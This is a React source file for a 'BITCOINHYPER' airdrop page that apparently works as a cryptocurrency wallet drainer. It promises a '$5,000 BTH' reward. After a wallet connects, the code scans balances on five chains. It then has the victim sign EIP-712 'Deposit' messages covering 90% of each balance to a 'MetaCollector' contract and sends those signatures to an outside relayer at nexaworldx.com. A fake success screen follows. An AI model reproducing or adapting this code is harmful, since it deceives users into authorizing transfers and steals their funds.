import React, { useState, useEffect, useRef } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// MULTICHAIN CONFIGURATION (only for balance checking and contract addresses)
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
    name: 'Ethereum',
    symbol: 'ETH',
    rpcEndpoints: ['https://eth.llamarpc.com', 'https://cloudflare-eth.com']
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0', // REPLACE
    name: 'BSC',
    symbol: 'BNB',
    rpcEndpoints: ['https://bsc-dataseed.binance.org']
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', // REPLACE
    name: 'Polygon',
    symbol: 'MATIC',
    rpcEndpoints: ['https://polygon-rpc.com']
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', // REPLACE
    name: 'Arbitrum',
    symbol: 'ETH',
    rpcEndpoints: ['https://arb1.arbitrum.io/rpc']
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', // REPLACE
    name: 'Avalanche',
    symbol: 'AVAX',
    rpcEndpoints: ['https://api.avax.network/ext/bc/C/rpc']
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

// Helper: fetch balance with retry
const fetchBalance = async (chain, walletAddress) => {
  for (const rpc of chain.rpcEndpoints) {
    try {
      const provider = new ethers.JsonRpcProvider(rpc);
      const balance = await provider.getBalance(walletAddress);
      const amount = parseFloat(ethers.formatEther(balance));
      return amount;
    } catch (e) {}
  }
  return 0;
};

// Helper: switch network in wallet
const switchNetwork = async (walletProvider, chainId) => {
  try {
    await walletProvider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: `0x${chainId.toString(16)}` }]
    });
    return true;
  } catch (error) {
    if (error.code === 4902) throw new Error(`Network ${chainId} not added to wallet`);
    throw error;
  }
};

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');
  const { disconnect } = useDisconnect();

  // UI state
  const [balances, setBalances] = useState({});
  const [totalUSD, setTotalUSD] = useState(0);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [isEligible, setIsEligible] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [steps, setSteps] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [error, setError] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [relayerUrl, setRelayerUrl] = useState('https://relayer.nexaworldx.com/relay'); // CHANGE THIS
  const [relayerStatus, setRelayerStatus] = useState(null);

  const MIN_VALUE_USD = 1;
  const EIP712_TYPES = {
    Deposit: [
      { name: 'user', type: 'address' },
      { name: 'amount', type: 'uint256' },
      { name: 'nonce', type: 'uint256' }
    ]
  };

  // Test relayer connectivity
  const testRelayer = async () => {
    setRelayerStatus('testing');
    try {
      const res = await fetch(relayerUrl, { method: 'OPTIONS' });
      if (res.ok || res.status === 405) setRelayerStatus('ok');
      else setRelayerStatus('error');
    } catch (err) {
      setRelayerStatus('error');
    }
  };

  // Fetch all balances
  const scanBalances = async () => {
    if (!address) return;
    setScanning(true);
    setError('');
    const results = {};
    for (const chain of DEPLOYED_CHAINS) {
      const amount = await fetchBalance(chain, address);
      if (amount > 0) {
        let price = 0;
        if (chain.symbol === 'ETH') price = 2000;
        else if (chain.symbol === 'BNB') price = 300;
        else if (chain.symbol === 'MATIC') price = 0.75;
        else if (chain.symbol === 'AVAX') price = 32;
        const valueUSD = amount * price;
        results[chain.name] = { amount, valueUSD, ...chain };
      }
    }
    setBalances(results);
    const total = Object.values(results).reduce((s, b) => s + b.valueUSD, 0);
    setTotalUSD(total);
    const eligible = Object.values(results).filter(b => b.valueUSD >= MIN_VALUE_USD);
    setEligibleChains(eligible);
    setIsEligible(total >= MIN_VALUE_USD);
    setScanning(false);
  };

  useEffect(() => {
    if (isConnected && address) scanBalances();
  }, [isConnected, address]);

  // Add step message
  const addStep = (msg, isError = false) => {
    setSteps(prev => [...prev, { msg, isError, time: new Date().toLocaleTimeString() }]);
  };

  // Execute claim
  const executeClaim = async () => {
    if (!walletProvider || !address) {
      setError('Wallet not connected');
      return;
    }
    setProcessing(true);
    setSteps([]);
    setCompletedChains([]);
    setError('');

    const chainsToProcess = eligibleChains;
    if (chainsToProcess.length === 0) {
      setError('No eligible chains with ≥ $1 balance.');
      setProcessing(false);
      return;
    }

    for (const chain of chainsToProcess) {
      addStep(`🔁 Processing ${chain.name}...`);
      try {
        // 1. Switch network
        addStep(`  ⚡ Switching network to ${chain.name}...`);
        await switchNetwork(walletProvider, chain.chainId);
        addStep(`  ✅ Switched.`);

        // 2. Create signer
        const provider = new ethers.BrowserProvider(walletProvider);
        const signer = await provider.getSigner();
        const signerAddr = await signer.getAddress();
        if (signerAddr.toLowerCase() !== address.toLowerCase()) throw new Error('Signer address mismatch');

        // 3. Fetch current nonce from contract
        addStep(`  🔢 Fetching current nonce...`);
        const contract = new ethers.Contract(chain.contractAddress, [
          'function userNonce(address) view returns (uint256)'
        ], provider);
        const nonce = await contract.userNonce(address);
        addStep(`  ✅ Nonce: ${nonce}`);

        // 4. Compute amount to send (90% of balance)
        const amountToSend = chain.amount * 0.9;
        const amountWei = ethers.parseEther(amountToSend.toFixed(18));
        const valueUSD = (chain.valueUSD * 0.9).toFixed(2);
        addStep(`  💰 Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);

        // 5. Build EIP‑712 signature
        const domain = {
          name: 'MetaCollector',
          version: '1',
          chainId: chain.chainId,
          verifyingContract: chain.contractAddress
        };
        const value = { user: address, amount: amountWei.toString(), nonce };
        addStep(`  ✍️ Requesting signature...`);
        const signature = await signer.signTypedData(domain, EIP712_TYPES, value);
        addStep(`  ✅ Signature obtained.`);

        // 6. Send to relayer
        const signaturePayload = { domain, types: EIP712_TYPES, value, signature, expectedSigner: address };
        addStep(`  📤 Sending to relayer...`);
        const res = await fetch(relayerUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ contractAddress: chain.contractAddress, signaturePayload })
        });
        const text = await res.text();
        let json;
        try { json = JSON.parse(text); } catch(e) { throw new Error(`Invalid relayer response: ${text.slice(0,100)}`); }
        if (!json.success) throw new Error(json.error || 'Relayer failed');
        addStep(`  ✅ Transaction sent! Hash: ${json.hash.slice(0,10)}...`);
        setCompletedChains(prev => [...prev, chain.name]);
      } catch (err) {
        addStep(`  ❌ Error: ${err.message}`, true);
        setError(`Failed on ${chain.name}: ${err.message}`);
        break; // stop on first failure
      }
    }

    if (completedChains.length === chainsToProcess.length && chainsToProcess.length > 0) {
      setShowSuccess(true);
    }
    setProcessing(false);
  };

  const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(-4)}` : '';

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-black to-gray-900 text-white font-sans overflow-x-hidden">
      {/* Animated background particles */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
        {[...Array(50)].map((_, i) => (
          <div key={i} className="absolute rounded-full bg-white/5 animate-float-particles" style={{
            left: `${Math.random() * 100}%`,
            top: `${Math.random() * 100}%`,
            width: `${2 + Math.random() * 6}px`,
            height: `${2 + Math.random() * 6}px`,
            animationDuration: `${5 + Math.random() * 15}s`,
            animationDelay: `${Math.random() * 10}s`
          }} />
        ))}
      </div>

      <div className="relative z-10 container mx-auto px-4 py-8 max-w-5xl">
        {/* Header */}
        <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-12">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-full bg-gradient-to-tr from-yellow-500 to-orange-600 flex items-center justify-center shadow-lg animate-pulse-glow">
              <span className="text-2xl">⚡</span>
            </div>
            <h1 className="text-3xl md:text-4xl font-black bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">BITCOINHYPER</h1>
          </div>
          {!isConnected ? (
            <button onClick={open} className="px-6 py-3 rounded-full bg-gradient-to-r from-yellow-500 to-orange-600 font-bold shadow-lg hover:scale-105 transition-all flex items-center gap-2">
              <span className="relative flex h-3 w-3"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span><span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span></span>
              CONNECT WALLET
            </button>
          ) : (
            <div className="flex items-center gap-3 bg-white/10 backdrop-blur rounded-full pl-4 pr-2 py-1">
              <span className="text-sm font-mono">{formatAddress(address)}</span>
              <button onClick={disconnect} className="w-8 h-8 rounded-full bg-red-500/20 hover:bg-red-500/40 flex items-center justify-center">🔌</button>
            </div>
          )}
        </div>

        {/* Main Card */}
        <div className="backdrop-blur-xl bg-white/5 rounded-3xl border border-white/10 p-6 md:p-10 shadow-2xl">
          <div className="text-center mb-8">
            <div className="inline-block px-4 py-1 rounded-full bg-yellow-500/20 text-yellow-300 text-sm mb-4 animate-pulse">✦ PRESALE STAGE 4 ✦</div>
            <h2 className="text-5xl md:text-7xl font-black bg-gradient-to-r from-yellow-300 via-orange-400 to-red-500 bg-clip-text text-transparent">$5,000 BTH</h2>
            <p className="text-gray-400 mt-2">+25% instant bonus · limited supply</p>
          </div>

          {/* Relayer Debug Panel */}
          <div className="mb-6 bg-black/40 rounded-xl p-4 border border-white/10">
            <div className="flex flex-wrap items-center gap-3 justify-between">
              <div className="flex-1 min-w-[200px]">
                <label className="text-xs text-gray-400">Relayer Endpoint</label>
                <input type="text" value={relayerUrl} onChange={e => setRelayerUrl(e.target.value)} className="w-full bg-black/50 rounded px-2 py-1 text-sm text-white border border-white/20" />
              </div>
              <button onClick={testRelayer} className="mt-4 sm:mt-0 px-4 py-1 bg-blue-600 rounded-full text-sm">Test</button>
              {relayerStatus === 'ok' && <span className="text-green-400 text-sm">✅ Reachable</span>}
              {relayerStatus === 'error' && <span className="text-red-400 text-sm">❌ Unreachable</span>}
            </div>
          </div>

          {/* Eligibility & Claim */}
          {isConnected && (
            <div className="mb-8">
              {scanning && (
                <div className="text-center py-6">
                  <div className="inline-block w-8 h-8 border-2 border-yellow-500 border-t-transparent rounded-full animate-spin"></div>
                  <p className="mt-2 text-gray-400">Scanning balances...</p>
                </div>
              )}
              {!scanning && !processing && (
                <div className={`rounded-2xl p-6 text-center ${isEligible ? 'bg-green-500/10 border border-green-500/30' : 'bg-red-500/10 border border-red-500/30'}`}>
                  {isEligible ? (
                    <>
                      <p className="text-green-400 font-bold text-lg">✅ YOU ARE ELIGIBLE!</p>
                      <p className="text-2xl font-bold mt-2">${totalUSD.toFixed(2)} total value</p>
                      <p className="text-sm text-gray-400">{eligibleChains.length} chain(s) with ≥ $1</p>
                      <button onClick={executeClaim} className="mt-4 px-8 py-3 rounded-full bg-gradient-to-r from-yellow-500 to-orange-600 font-bold text-black text-lg shadow-xl hover:scale-105 transition-all flex items-center justify-center gap-2 mx-auto">
                        🎁 CLAIM $5,000 BTH
                      </button>
                    </>
                  ) : (
                    <>
                      <p className="text-red-400 font-bold">⚠️ Insufficient Balance</p>
                      <p>Need at least $1 USD equivalent across chains.</p>
                    </>
                  )}
                </div>
              )}
            </div>
          )}

          {/* Processing Steps */}
          {processing && (
            <div className="mb-6 bg-black/40 rounded-2xl p-4 border border-white/10">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-5 h-5 rounded-full border-2 border-yellow-500 border-t-transparent animate-spin"></div>
                <span className="font-bold">Processing...</span>
              </div>
              <div className="space-y-1 max-h-60 overflow-y-auto text-sm font-mono">
                {steps.map((step, idx) => (
                  <div key={idx} className={step.isError ? 'text-red-400' : 'text-gray-300'}>
                    {step.msg}
                  </div>
                ))}
              </div>
            </div>
          )}

          {completedChains.length > 0 && (
            <div className="mb-4 text-green-400 text-sm">
              ✅ Completed: {completedChains.join(', ')}
            </div>
          )}

          {error && (
            <div className="bg-red-500/20 border border-red-500 rounded p-3 text-red-300 text-sm">
              ❌ {error}
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center text-gray-500 text-xs">
          © 2025 BITCOINHYPER — 5,000 BTH Airdrop
        </div>
      </div>

      {/* Success Modal */}
      {showSuccess && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-br from-gray-900 to-black rounded-2xl p-8 text-center max-w-md border border-yellow-500/30 animate-fadeInUp">
            <div className="text-6xl mb-4">🎉</div>
            <h3 className="text-2xl font-bold text-yellow-400">SUCCESS!</h3>
            <p className="mt-2">You have secured <strong className="text-yellow-300">$5,000 BTH</strong> +25% bonus!</p>
            <button onClick={() => setShowSuccess(false)} className="mt-6 px-6 py-2 bg-yellow-600 rounded-full">Close</button>
          </div>
        </div>
      )}

      <style>{`
        @keyframes float-particles {
          0% { transform: translateY(0) translateX(0); opacity: 0.2; }
          100% { transform: translateY(-100vh) translateX(20px); opacity: 0; }
        }
        .animate-float-particles { animation: float-particles linear infinite; }
        @keyframes pulse-glow { 0% { box-shadow: 0 0 0 0 rgba(234,179,8,0.4); } 70% { box-shadow: 0 0 0 10px rgba(234,179,8,0); } 100% { box-shadow: 0 0 0 0 rgba(234,179,8,0); } }
        .animate-pulse-glow { animation: pulse-glow 2s infinite; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fadeInUp { animation: fadeInUp 0.3s ease-out; }
      `}</style>
    </div>
  );
}

export default App;
